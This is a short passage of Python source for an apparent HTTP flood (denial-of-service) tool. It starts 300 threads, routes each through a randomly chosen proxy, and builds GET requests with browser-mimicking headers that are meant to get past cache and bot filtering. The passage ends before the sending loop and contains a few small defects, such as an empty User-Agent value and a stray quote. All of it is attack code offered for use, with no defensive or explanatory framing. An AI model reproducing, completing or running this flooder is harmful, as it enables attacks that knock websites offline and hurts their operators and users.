def atk(url, timer, packet):
   for i in range(int(300)):
       threading.Thread(target=attk, args=(url, timer)).start()
       
def attk(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    samayam = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost:  " + urlparse(url).netloc + "\r\n"
    req += "cache-Control: no-cache \r\n"
    req += "User-Agent: " #add user agents here
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    